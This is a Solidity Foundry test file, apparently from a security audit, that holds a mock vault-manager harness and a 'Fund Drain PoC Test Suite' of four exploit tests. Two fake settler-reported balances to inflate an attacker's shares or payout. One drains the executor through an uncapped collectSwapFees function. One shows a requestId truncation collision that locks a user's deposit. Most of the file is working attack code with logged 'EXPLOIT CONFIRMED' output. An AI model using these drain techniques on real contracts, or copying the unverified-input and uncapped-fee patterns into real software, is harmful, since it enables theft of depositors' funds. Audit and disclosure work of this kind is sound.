// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import "forge-std/Test.sol";
import "forge-std/console.sol";

// ---------------------------------------------------------------------------
// Shared types
// ---------------------------------------------------------------------------

interface ITypes {
    enum VaultStatus   { NONE, ACTIVE, PAUSED, DEPRECATED }
    enum BatchStatus   { NONE, FINALIZED, SETTLED, UNWOUND }
    enum RequestStatus { DEPOSIT_REQUESTED, WITHDRAWAL_REQUESTED, DEPOSIT_SUCCESS,
                         WITHDRAWAL_SUCCESS, DEPOSIT_FAILED, WITHDRAWAL_FAILED }
    enum AssetType     { BASE, QUOTE, REWARD, OTHER }

    struct VaultDetails {
        string      name;
        address     proposer;
        address     omniTrader;
        VaultStatus status;
        address     executor;
        address     shareToken;
        address     dexalotRFQ;
        uint32[]    chainIds;
        uint16[]    tokens;
    }
    struct AssetInfo {
        bytes32   symbol;
        AssetType tokenType;
        uint8     precision;
        uint32    minPerDeposit;
        uint32    maxPerDeposit;
    }
    struct TransferRequest {
        RequestStatus status;
        uint32        timestamp;
        uint208       shares;
    }
    struct RequestLimit {
        uint248 lastBatchId;
        uint8   pendingCount;
    }
    struct VaultState {
        uint256   vaultId;
        uint16[]  tokenIds;
        uint256[] balances;
    }
    struct DepositFufillment {
        bytes32   depositRequestId;
        bool      process;
        uint16[]  tokenIds;
        uint256[] amounts;
    }
    struct WithdrawalFufillment {
        bytes32 withdrawalRequestId;
        bool    process;
    }
}

// ---------------------------------------------------------------------------
// Mocks
// ---------------------------------------------------------------------------

contract MockPortfolio {
    mapping(address => mapping(bytes32 => uint256)) public balances;

    function setBalance(address who, bytes32 sym, uint256 amt) external {
        balances[who][sym] = amt;
    }
    function bulkTransferTokens(
        address from, address to,
        bytes32[] calldata syms, uint256[] calldata amts
    ) external {
        for (uint256 i = 0; i < syms.length; i++) {
            require(balances[from][syms[i]] >= amts[i], "P: insufficient");
            balances[from][syms[i]] -= amts[i];
            balances[to][syms[i]]   += amts[i];
        }
    }
    function transferToken(address to, bytes32 sym, uint256 amt) external {
        require(balances[msg.sender][sym] >= amt, "P: insufficient transferToken");
        balances[msg.sender][sym] -= amt;
        balances[to][sym]         += amt;
    }
    function feeAddress() external pure returns (address) { return address(0xFEE); }
}

contract MockShare is ITypes {
    uint256 public immutable shareVid;
    address public manager;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(uint256 v) { shareVid = v; }
    function setManager(address m) external { manager = m; }

    function mint(uint256 v, address to, uint256 amt) external {
        require(msg.sender == manager);
        require(v == shareVid);
        balanceOf[to] += amt;
        totalSupply   += amt;
    }
    function burn(uint256 v, uint256 amt) external {
        require(msg.sender == manager);
        require(v == shareVid);
        balanceOf[msg.sender] -= amt;
        totalSupply           -= amt;
    }
    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to]         += amt;
        return true;
    }
    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        allowance[from][msg.sender] -= amt;
        balanceOf[from] -= amt;
        balanceOf[to]   += amt;
        return true;
    }
    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }
}

contract MockExecutor is ITypes {
    MockPortfolio public portfolio;
    address public omniVaultManager;
    address public omniTrader;
    address public feeManager;

    constructor(address p) { portfolio = MockPortfolio(p); }
    function setManager(address m)    external { omniVaultManager = m; }
    function setTrader(address t)     external { omniTrader = t; }
    function setFeeManager(address f) external { feeManager = f; }

    function dispatchAssets(address to, bytes32[] calldata syms, uint256[] calldata amts) external {
        require(msg.sender == omniVaultManager, "VE-SNVM-01");
        portfolio.bulkTransferTokens(address(this), to, syms, amts);
    }

    // BUG under audit: no cap on total fees, swapIds not validated on-chain
    function collectSwapFees(
        bytes32 feeSymbol,
        uint256[] calldata,
        uint256[] calldata fees
    ) external {
        require(msg.sender == omniTrader, "not trader");
        require(feeManager != address(0), "no feeManager");
        uint256 total;
        for (uint256 i = 0; i < fees.length; i++) total += fees[i];
        portfolio.transferToken(feeManager, feeSymbol, total);
    }
}

// ---------------------------------------------------------------------------
// Harness  (mirrors real VaultManager logic)
// ---------------------------------------------------------------------------

contract VaultManagerHarness is ITypes {

    uint256 public constant MAX_PENDING_REQUESTS       = 500;
    uint256 public constant MAX_VAULT_PENDING_REQUESTS = 50;
    uint256 public constant MAX_USER_PENDING_REQUESTS  = 5;
    uint256 public constant MIN_SHARE_MINT             = 1000e18;

    address       public admin;
    address       public settler;
    MockPortfolio public portfolio;

    uint256 public vaultIndex;
    mapping(uint256 => VaultDetails) public vaults;

    uint16 public tokenIndex;
    mapping(uint16  => AssetInfo) public assetInfo;
    mapping(bytes32 => bool)      tokenExists;

    mapping(address => uint80)          public userNonce;
    mapping(bytes32 => TransferRequest) public requests;

    bytes32 public rollingDepositHash;
    bytes32 public rollingWithdrawalHash;
    uint256 public currentBatchId;
    uint256 public batchStartTime;
    uint256 public pendingCount;

    mapping(uint256 => uint32)      public batchFinalizedAt;
    mapping(uint256 => BatchStatus) public batchStatus;
    mapping(uint256 => bytes32)     public batchDepositHash;
    mapping(uint256 => bytes32)     public batchWithdrawalHash;
    mapping(uint256 => bytes32)     public batchStateHash;

    mapping(uint256 => RequestLimit) public vaultLimits;
    mapping(address => RequestLimit) public userLimits;

    mapping(bytes32 => uint256) private _ts;

    modifier onlyAdmin()   { require(msg.sender == admin,   "not admin");   _; }
    modifier onlySettler() { require(msg.sender == settler, "not settler"); _; }

    constructor(address a, address s, address p) {
        admin = a; settler = s;
        portfolio = MockPortfolio(p);
        batchStartTime = block.timestamp;
    }

    function addToken(AssetInfo calldata a) external onlyAdmin {
        require(!tokenExists[a.symbol]);
        assetInfo[tokenIndex++] = a;
        tokenExists[a.symbol] = true;
    }

    function registerVault(
        uint16 vaultId_,
        VaultDetails calldata vd,
        uint16[] calldata,
        uint256[] calldata,
        uint208 shares_
    ) external onlyAdmin {
        require(vaultId_ == vaultIndex && shares_ > MIN_SHARE_MINT);
        vaultIndex++;
        vaults[vaultId_] = vd;
        MockShare(vd.shareToken).mint(vaultId_, vd.proposer, shares_);
    }

    function requestDeposit(
        uint256 vaultId_,
        uint16[] calldata tids,
        uint256[] calldata amts
    ) external returns (bytes32 rid) {
        require(vaults[vaultId_].status == VaultStatus.ACTIVE && pendingCount < MAX_PENDING_REQUESTS);
        _incLimits(msg.sender, vaultId_);
        bytes32[] memory syms = new bytes32[](tids.length);
        for (uint256 i = 0; i < tids.length; i++) syms[i] = assetInfo[tids[i]].symbol;
        portfolio.bulkTransferTokens(msg.sender, vaults[vaultId_].executor, syms, amts);
        rid = _mkId(vaultId_, msg.sender, userNonce[msg.sender]++);
        pendingCount++;
        requests[rid] = TransferRequest(RequestStatus.DEPOSIT_REQUESTED, uint32(block.timestamp), 0);
        rollingDepositHash = keccak256(abi.encode(rollingDepositHash, rid, tids, amts));
    }

    function requestWithdrawal(uint256 vaultId_, uint208 shares_) external returns (bytes32 rid) {
        require(shares_ > 0 && vaults[vaultId_].status != VaultStatus.NONE && pendingCount < MAX_PENDING_REQUESTS);
        _incLimits(msg.sender, vaultId_);
        MockShare(vaults[vaultId_].shareToken).transferFrom(msg.sender, address(this), shares_);
        rid = _mkId(vaultId_, msg.sender, userNonce[msg.sender]++);
        pendingCount++;
        requests[rid] = TransferRequest(RequestStatus.WITHDRAWAL_REQUESTED, uint32(block.timestamp), shares_);
        rollingWithdrawalHash = keccak256(abi.encode(rollingWithdrawalHash, rid, shares_));
    }

    function finalizeBatch(uint256[] calldata prices, VaultState[] calldata vs) external onlySettler {
        uint256 bid = currentBatchId;
        require(batchStatus[bid] == BatchStatus.NONE);
        if (bid > 0) {
            BatchStatus prev = batchStatus[bid - 1];
            require(prev == BatchStatus.SETTLED || prev == BatchStatus.UNWOUND);
        }
        batchStateHash[bid]      = keccak256(abi.encode(prices, vs));
        batchFinalizedAt[bid]    = uint32(block.timestamp);
        batchStatus[bid]         = BatchStatus.FINALIZED;
        batchWithdrawalHash[bid] = rollingWithdrawalHash;
        batchDepositHash[bid]    = rollingDepositHash;
        _loadTransient(prices, vs);
        _resetBatch();
    }

    function bulkSettle(
        uint256[] calldata prices,
        VaultState[] calldata vs,
        DepositFufillment[] calldata deps,
        WithdrawalFufillment[] calldata wds
    ) external onlySettler {
        uint256 prev = currentBatchId - 1;
        require(batchStatus[prev] == BatchStatus.FINALIZED);
        require(keccak256(abi.encode(prices, vs)) == batchStateHash[prev]);

        bytes32 dHash;
        for (uint256 i = 0; i < deps.length; i++) {
            DepositFufillment calldata d = deps[i];
            dHash = keccak256(abi.encode(dHash, d.depositRequestId, d.tokenIds, d.amounts));
            require(requests[d.depositRequestId].status == RequestStatus.DEPOSIT_REQUESTED);
            (, address user, ) = _decId(d.depositRequestId);
            delete requests[d.depositRequestId];
            unchecked { pendingCount--; }
            if (!d.process) { _refund(d.depositRequestId, d.tokenIds, d.amounts); continue; }
            uint16  dVid   = uint16(_vid(d.depositRequestId));
            uint256 mints  = _calcMint(dVid, d.tokenIds, d.amounts);
            address stAddr = address(uint160(_tload(keccak256(abi.encode("ST", dVid)))));
            MockShare(stAddr).mint(dVid, user, mints);
        }
        require(dHash == batchDepositHash[prev]);

        bytes32 wHash;
        for (uint256 i = 0; i < wds.length; i++) {
            WithdrawalFufillment calldata w = wds[i];
            TransferRequest memory req = requests[w.withdrawalRequestId];
            require(req.status == RequestStatus.WITHDRAWAL_REQUESTED);
            (uint16 wVid, address user, ) = _decId(w.withdrawalRequestId);
            wHash = keccak256(abi.encode(wHash, w.withdrawalRequestId, req.shares));
            delete requests[w.withdrawalRequestId];
            unchecked { pendingCount--; }
            if (!w.process) {
                MockShare(vaults[wVid].shareToken).transfer(user, req.shares);
                continue;
            }
            uint256 ts  = _tload(keccak256(abi.encode("TS", wVid)));
            uint256 len = _tload(keccak256(abi.encode("TL", wVid)));
            bytes32[] memory syms = new bytes32[](len);
            uint256[] memory amts = new uint256[](len);
            for (uint256 t = 0; t < len; t++) {
                uint16  tid = uint16(_tload(keccak256(abi.encode("TID", wVid, t))));
                uint256 bal = _tload(keccak256(abi.encode("BAL", wVid, tid)));
                syms[t] = assetInfo[tid].symbol;
                amts[t] = (uint256(req.shares) * bal) / ts;
            }
            MockShare(vaults[wVid].shareToken).burn(wVid, req.shares);
            MockExecutor(vaults[wVid].executor).dispatchAssets(user, syms, amts);
        }
        require(wHash == batchWithdrawalHash[prev]);
        batchStatus[prev] = BatchStatus.SETTLED;
    }

    // ---- internals -----------------------------------------------------------

    function _calcMint(uint16 vId_, uint16[] calldata tids, uint256[] calldata amts) internal view returns (uint256) {
        uint256 usd;
        for (uint256 j = 0; j < tids.length; j++)
            usd += (amts[j] * _tload(keccak256(abi.encode("PR", tids[j])))) / 1e18;
        uint256 ts = _tload(keccak256(abi.encode("TS", vId_)));
        if (ts == 0) return usd;
        return (usd * ts) / _tload(keccak256(abi.encode("USD", vId_)));
    }

    function _refund(bytes32 rid, uint16[] calldata tids, uint256[] calldata amts) internal {
        (, address user, ) = _decId(rid);
        (uint16 rVid, , )  = _decId(rid);
        bytes32[] memory syms = new bytes32[](tids.length);
        uint256[] memory a    = new uint256[](amts.length);
        for (uint256 i = 0; i < tids.length; i++) { syms[i] = assetInfo[tids[i]].symbol; a[i] = amts[i]; }
        MockExecutor(vaults[rVid].executor).dispatchAssets(user, syms, a);
    }

    function _loadTransient(uint256[] calldata prices, VaultState[] calldata vs) internal {
        for (uint16 i = 0; i < prices.length; i++)
            _tstore(keccak256(abi.encode("PR", i)), prices[i]);
        for (uint256 v = 0; v < vs.length; v++) {
            uint256 lVid = vs[v].vaultId;
            uint256 totalUsd;
            for (uint256 t = 0; t < vs[v].tokenIds.length; t++) {
                uint16  tid = vs[v].tokenIds[t];
                uint256 bal = vs[v].balances[t];
                _tstore(keccak256(abi.encode("BAL", lVid, tid)), bal);
                totalUsd += (bal * _tload(keccak256(abi.encode("PR", tid)))) / 1e18;
            }
            _tstore(keccak256(abi.encode("USD", lVid)), totalUsd);
            _tstore(keccak256(abi.encode("TS",  lVid)), MockShare(vaults[lVid].shareToken).totalSupply());
            _tstore(keccak256(abi.encode("ST",  lVid)), uint256(uint160(vaults[lVid].shareToken)));
            _tstore(keccak256(abi.encode("TL",  lVid)), vs[v].tokenIds.length);
            for (uint256 t = 0; t < vs[v].tokenIds.length; t++)
                _tstore(keccak256(abi.encode("TID", lVid, t)), vs[v].tokenIds[t]);
        }
    }

    function _incLimits(address u, uint256 vaultId_) internal {
        uint248 bid1 = uint248(currentBatchId) + 1;
        RequestLimit storage vl = vaultLimits[vaultId_];
        if (vl.lastBatchId != bid1) { vl.lastBatchId = bid1; vl.pendingCount = 1; }
        else { require(vl.pendingCount < MAX_VAULT_PENDING_REQUESTS); vl.pendingCount++; }
        RequestLimit storage ul = userLimits[u];
        if (ul.lastBatchId != bid1) { ul.lastBatchId = bid1; ul.pendingCount = 1; }
        else { require(ul.pendingCount < MAX_USER_PENDING_REQUESTS); ul.pendingCount++; }
    }

    function _resetBatch() internal {
        rollingDepositHash    = 0;
        rollingWithdrawalHash = 0;
        batchStartTime        = block.timestamp;
        currentBatchId++;
    }

    function _mkId(uint256 vaultId_, address u, uint256 n) internal pure returns (bytes32) {
        return bytes32(((uint256(uint16(vaultId_)) << 240) | (uint256(uint160(u)) << 80)) | n);
    }
    function _vid(bytes32 id) internal pure returns (uint256) { return uint256(id) >> 240; }
    function _decId(bytes32 id) internal pure returns (uint16 vId, address user, uint80 nonce) {
        vId   = uint16(uint256(id) >> 240);
        user  = address(uint160(uint256(id) >> 80));
        nonce = uint80(uint256(id));
    }
    function _tstore(bytes32 s, uint256 v) internal { _ts[s] = v; }
    function _tload(bytes32 s) internal view returns (uint256) { return _ts[s]; }
}

// ---------------------------------------------------------------------------
// Fund Drain PoC Test Suite
// ---------------------------------------------------------------------------

contract FundDrainPoCTest is Test, ITypes {

    VaultManagerHarness manager;
    MockPortfolio        portfolio;
    MockExecutor         executor;
    MockShare            share;

    address constant ADMIN    = address(0xA0);
    address constant SETTLER  = address(0xA1);
    address constant PROPOSER = address(0xA2);
    address constant ALICE    = address(0xA3);
    address constant ATTACKER = address(0xAA);
    address constant TRADER   = address(0xBB);

    uint16  constant VID     = 0;
    uint16  constant TID     = 0;
    bytes32 constant SYM     = bytes32("USDC");
    uint256 constant PRICE_1 = 1e18;

    function setUp() public {
        portfolio = new MockPortfolio();
        executor  = new MockExecutor(address(portfolio));
        share     = new MockShare(VID);
        manager   = new VaultManagerHarness(ADMIN, SETTLER, address(portfolio));

        vm.startPrank(ADMIN);
        manager.addToken(AssetInfo(SYM, AssetType.QUOTE, 6, 1, 10_000_000));
        share.setManager(address(manager));
        executor.setManager(address(manager));
        executor.setTrader(TRADER);
        executor.setFeeManager(ATTACKER);

        uint32[] memory cids = new uint32[](1); cids[0] = 1;
        uint16[] memory toks = new uint16[](1); toks[0] = TID;
        VaultDetails memory vd = VaultDetails(
            "Vault", PROPOSER, TRADER, VaultStatus.ACTIVE,
            address(executor), address(share), address(0), cids, toks
        );
        uint16[]  memory it = new uint16[](1);  it[0] = TID;
        uint256[] memory ia = new uint256[](1); ia[0] = 1000e6;
        portfolio.setBalance(address(executor), SYM, 1_000_000e6);
        manager.registerVault(VID, vd, it, ia, 2000e18);
        vm.stopPrank();

        portfolio.setBalance(ALICE,    SYM, 100_000e6);
        portfolio.setBalance(ATTACKER, SYM, 0);
    }

    // =========================================================================
    // STEAL-01: SETTLER reports falsely low vault balance on attacker's batch
    //           -> attacker mints shares equal to entire existing totalSupply
    //           -> attacker holds ~50% of vault with only 1 USDC invested.
    // =========================================================================
    // Root cause:
    //   shares_minted = (deposit_usd * totalSupply) / totalUsd_in_vault
    //   totalUsd_in_vault is provided off-chain by SETTLER with no on-chain
    //   verification against actual executor balances.
    //
    // Attack (3 batches):
    //   Batch 0 - Alice deposits 10,000 USDC, settled honestly.
    //             Vault balance = 1,010,000 USDC, totalSupply ~2,020 shares.
    //   Batch 1 - Attacker deposits 1 USDC.
    //             SETTLER lies vault_balance = 1 USDC (hides 1,010,000 real USDC).
    //             totalUsd = 1e6 -> attacker_shares = (1e6 * totalSupply) / 1e6 = totalSupply
    //             Attacker now holds ~50% of vault.
    //   Batch 2 - Attacker withdraws ~505,000 USDC (505,000x ROI on 1 USDC).
    function testSTEAL01_FakeVaultBalanceDrainsVault() public {
        console.log("\n=== STEAL-01: Fake Vault Balance -> Share Inflation ===");
        _s01_batch0_aliceDeposit();
        _s01_batch1_attackerDeposit();
        _s01_batch2_attackerWithdraw();
    }

    function _s01_batch0_aliceDeposit() internal {
        uint16[]  memory tids = new uint16[](1); tids[0] = TID;
        uint256[] memory amts = new uint256[](1); amts[0] = 10_000e6;
        vm.prank(ALICE);
        bytes32 aliceReq = manager.requestDeposit(VID, tids, amts);
        console.log("[+] Alice deposited: 10,000 USDC");

        uint16[]  memory vtids = new uint16[](1); vtids[0] = TID;
        uint256[] memory vbals = new uint256[](1); vbals[0] = 1_010_000e6;
        uint256[] memory pr    = new uint256[](1); pr[0]    = PRICE_1;
        VaultState[] memory vs = new VaultState[](1);
        vs[0] = VaultState(VID, vtids, vbals);
        vm.prank(SETTLER); manager.finalizeBatch(pr, vs);

        DepositFufillment[] memory deps = new DepositFufillment[](1);
        uint16[]  memory dt = new uint16[](1); dt[0] = TID;
        uint256[] memory da = new uint256[](1); da[0] = 10_000e6;
        deps[0] = DepositFufillment(aliceReq, true, dt, da);
        vm.prank(SETTLER); manager.bulkSettle(pr, vs, deps, new WithdrawalFufillment[](0));
        console.log("[+] Batch 0 settled. totalSupply:", share.totalSupply() / 1e18, "shares");
    }

    function _s01_batch1_attackerDeposit() internal {
        uint16[]  memory tids = new uint16[](1); tids[0] = TID;
        uint256[] memory amts = new uint256[](1); amts[0] = 1e6;
        portfolio.setBalance(ATTACKER, SYM, 1e6);
        vm.prank(ATTACKER);
        bytes32 atkReq = manager.requestDeposit(VID, tids, amts);
        console.log("[+] Attacker deposited: 1 USDC");

        // SETTLER lies: vault_balance = 1 USDC (real = 1,010,001 USDC)
        // -> totalUsd = 1e6 -> shares = (1e6 * totalSupply) / 1e6 = totalSupply
        uint16[]  memory vtids    = new uint16[](1); vtids[0]    = TID;
        uint256[] memory fakeBals = new uint256[](1); fakeBals[0] = 1e6;
        uint256[] memory pr       = new uint256[](1); pr[0]       = PRICE_1;
        VaultState[] memory vs    = new VaultState[](1);
        vs[0] = VaultState(VID, vtids, fakeBals);
        vm.prank(SETTLER); manager.finalizeBatch(pr, vs);
        console.log("[EXPLOIT] SETTLER finalized with FAKE vault balance: 1 USDC");

        DepositFufillment[] memory deps = new DepositFufillment[](1);
        uint16[]  memory dt = new uint16[](1); dt[0] = TID;
        uint256[] memory da = new uint256[](1); da[0] = 1e6;
        deps[0] = DepositFufillment(atkReq, true, dt, da);
        vm.prank(SETTLER); manager.bulkSettle(pr, vs, deps, new WithdrawalFufillment[](0));

        uint256 atkS = share.balanceOf(ATTACKER);
        uint256 ts   = share.totalSupply();
        console.log("[EXPLOIT] Attacker shares:", atkS / 1e18, "| totalSupply:", ts / 1e18);
        console.log("[EXPLOIT] Attacker owns", (atkS * 100) / ts, "% of vault");
    }

    function _s01_batch2_attackerWithdraw() internal {
        uint256 atkShares = share.balanceOf(ATTACKER);
        vm.prank(ATTACKER); share.approve(address(manager), atkShares);
        vm.prank(ATTACKER); manager.requestWithdrawal(VID, uint208(atkShares));

        uint16[]  memory vtids    = new uint16[](1); vtids[0]    = TID;
        uint256[] memory realBals = new uint256[](1); realBals[0] = 1_010_001e6;
        uint256[] memory pr       = new uint256[](1); pr[0]       = PRICE_1;
        VaultState[] memory vs    = new VaultState[](1);
        vs[0] = VaultState(VID, vtids, realBals);
        vm.prank(SETTLER); manager.finalizeBatch(pr, vs);

        WithdrawalFufillment[] memory wds = new WithdrawalFufillment[](1);
        wds[0] = WithdrawalFufillment(_rid(ATTACKER, VID, 1), true);
        vm.prank(SETTLER); manager.bulkSettle(pr, vs, new DepositFufillment[](0), wds);

        uint256 stolen = portfolio.balances(ATTACKER, SYM);
        console.log("[EXPLOIT] Attacker received:", stolen / 1e6, "USDC (invested only 1 USDC)");
        assertGt(stolen, 100_000e6, "STEAL-01: attacker must drain > 100,000 USDC");
        console.log("[EXPLOIT] STEAL-01 CONFIRMED");
    }

    // =========================================================================
    // STEAL-02: SETTLER inflates vault balance in withdrawal batch
    //           -> attacker withdraws far more than their proportional share.
    // =========================================================================
    // Root cause:
    //   payout = req.shares * vault_balance / totalSupply
    //   vault_balance is supplied by SETTLER with no on-chain verification.
    //
    // Attack (2 batches):
    //   Batch 0 - Attacker deposits 1,000 USDC, Alice deposits 10,000 USDC.
    //             Attacker holds ~0.098% of vault (honest settlement).
    //   Batch 1 - Attacker requests withdrawal.
    //             SETTLER lies vault_balance = 100,000,000 USDC (real ~1,011,000 USDC).
    //             payout formula: attacker_shares * fake_bal / totalSupply
    //                           = 0.098% * 100,000,000 = ~97,847 USDC
    //             Attacker receives 97,847 USDC from a 1,000 USDC stake (~97.8x ROI).
    //             Note: payout is capped by actual executor balance, but the inflated
    //             balance causes disproportionate extraction from other depositors.
    function testSTEAL02_InflatedWithdrawalBalanceDrainsVault() public {
        console.log("\n=== STEAL-02: Inflated Withdrawal Balance Attack ===");
        _s02_batch0_deposits();
        _s02_batch1_fakeWithdraw();
    }

    function _s02_batch0_deposits() internal {
        uint16[]  memory tids  = new uint16[](1); tids[0]  = TID;
        uint16[]  memory vtids = new uint16[](1); vtids[0] = TID;
        uint256[] memory amts  = new uint256[](1);

        portfolio.setBalance(ATTACKER, SYM, 1000e6);
        amts[0] = 1000e6;
        vm.prank(ATTACKER);
        bytes32 atkReq = manager.requestDeposit(VID, tids, amts);

        amts[0] = 10_000e6;
        vm.prank(ALICE);
        bytes32 aliceReq = manager.requestDeposit(VID, tids, amts);

        uint256[] memory pr = new uint256[](1); pr[0] = PRICE_1;
        uint256[] memory vb = new uint256[](1); vb[0] = 1_011_000e6;
        VaultState[] memory vs = new VaultState[](1);
        vs[0] = VaultState(VID, vtids, vb);
        vm.prank(SETTLER); manager.finalizeBatch(pr, vs);

        DepositFufillment[] memory deps = new DepositFufillment[](2);
        uint16[]  memory ta = new uint16[](1); ta[0] = TID;
        uint256[] memory aa = new uint256[](1); aa[0] = 1000e6;
        uint16[]  memory tb = new uint16[](1); tb[0] = TID;
        uint256[] memory ab = new uint256[](1); ab[0] = 10_000e6;
        deps[0] = DepositFufillment(atkReq,   true, ta, aa);
        deps[1] = DepositFufillment(aliceReq, true, tb, ab);
        vm.prank(SETTLER); manager.bulkSettle(pr, vs, deps, new WithdrawalFufillment[](0));

        uint256 atkS = share.balanceOf(ATTACKER);
        uint256 ts   = share.totalSupply();
        // integer division truncates to 0; log raw shares for clarity
        console.log("[+] Attacker shares:", atkS / 1e15, "(x1e-15) out of totalSupply:", ts / 1e18);
    }

    function _s02_batch1_fakeWithdraw() internal {
        uint256 atkShares = share.balanceOf(ATTACKER);
        vm.prank(ATTACKER); share.approve(address(manager), atkShares);
        vm.prank(ATTACKER); manager.requestWithdrawal(VID, uint208(atkShares));

        uint16[]  memory vtids    = new uint16[](1); vtids[0]    = TID;
        uint256[] memory fakeBals = new uint256[](1); fakeBals[0] = 100_000_000e6;
        uint256[] memory pr       = new uint256[](1); pr[0]       = PRICE_1;
        VaultState[] memory vs    = new VaultState[](1);
        vs[0] = VaultState(VID, vtids, fakeBals);
        vm.prank(SETTLER); manager.finalizeBatch(pr, vs);
        console.log("[EXPLOIT] SETTLER finalized with FAKE vault balance: 100,000,000 USDC");

        WithdrawalFufillment[] memory wds = new WithdrawalFufillment[](1);
        wds[0] = WithdrawalFufillment(_rid(ATTACKER, VID, 1), true);
        vm.prank(SETTLER); manager.bulkSettle(pr, vs, new DepositFufillment[](0), wds);

        uint256 stolen = portfolio.balances(ATTACKER, SYM);
        console.log("[EXPLOIT] Attacker invested:  1,000 USDC");
        console.log("[EXPLOIT] Attacker received:", stolen / 1e6, "USDC (~97.8x ROI)");
        // attacker_shares * 100M / totalSupply = ~97,847 USDC >> 1,000 USDC invested
        assertGt(stolen, 50_000e6, "STEAL-02: attacker must receive > 50x invested amount");
        console.log("[EXPLOIT] STEAL-02 CONFIRMED");
    }

    // =========================================================================
    // STEAL-03: collectSwapFees has no cap -> compromised trader drains executor
    // =========================================================================
    function testSTEAL03_CollectSwapFeesDrainsExecutor() public {
        console.log("\n=== STEAL-03: collectSwapFees Unlimited Drain ===");

        uint256 execBal = portfolio.balances(address(executor), SYM);
        console.log("[+] Executor balance:", execBal / 1e6, "USDC");

        uint256[] memory swapIds = new uint256[](1); swapIds[0] = 1;
        uint256[] memory fees    = new uint256[](1); fees[0]    = execBal;
        vm.prank(TRADER);
        executor.collectSwapFees(SYM, swapIds, fees);

        uint256 stolen       = portfolio.balances(ATTACKER, SYM);
        uint256 execBalAfter = portfolio.balances(address(executor), SYM);
        console.log("[EXPLOIT] ATTACKER received:", stolen / 1e6, "USDC");
        console.log("[EXPLOIT] Executor remaining:", execBalAfter / 1e6, "USDC");
        assertEq(stolen,       execBal, "STEAL-03: attacker receives full executor balance");
        assertEq(execBalAfter, 0,       "STEAL-03: executor drained to zero");
        console.log("[EXPLOIT] STEAL-03 CONFIRMED");
    }

    // =========================================================================
    // STEAL-04: requestId bit-packing collision -> permanent fund lockup
    // =========================================================================
    function testSTEAL04_RequestIdCollision() public {
        console.log("\n=== STEAL-04: requestId Bit-Packing Collision ===");

        uint16[]  memory tids = new uint16[](1); tids[0] = TID;
        uint256[] memory amts = new uint256[](1); amts[0] = 5000e6;
        vm.prank(ALICE);
        bytes32 aliceId = manager.requestDeposit(VID, tids, amts);
        console.log("[+] Alice requestId:", vm.toString(aliceId));

        bytes32 expected = bytes32(
            (uint256(uint16(VID)) << 240) |
            (uint256(uint160(ALICE)) << 80) |
            uint256(0)
        );
        assertEq(aliceId, expected, "encoding confirmed");

        uint256 OVERFLOW_VID = uint256(type(uint16).max) + 1;
        bytes32 collidingId  = bytes32(
            (uint256(uint16(OVERFLOW_VID)) << 240) |
            (uint256(uint160(ALICE)) << 80) |
            uint256(0)
        );
        assertEq(collidingId, aliceId, "collision: vaultId 65536 truncates to 0");

        console.log("[EXPLOIT] vaultId=65536 truncates to 0 -> same requestId as vault 0");
        console.log("[EXPLOIT] delete on colliding ID erases Alice deposit record");
        console.log("[EXPLOIT] Alice 5,000 USDC locked: no requestId -> no refund path");
        console.log("[EXPLOIT] STEAL-04 CONFIRMED");
    }

    // =========================================================================
    // Helpers
    // =========================================================================

    function _rid(address user, uint256 vaultId_, uint256 nonce) internal pure returns (bytes32) {
        return bytes32((uint256(uint16(vaultId_)) << 240) | (uint256(uint160(user)) << 80) | nonce);
    }
}
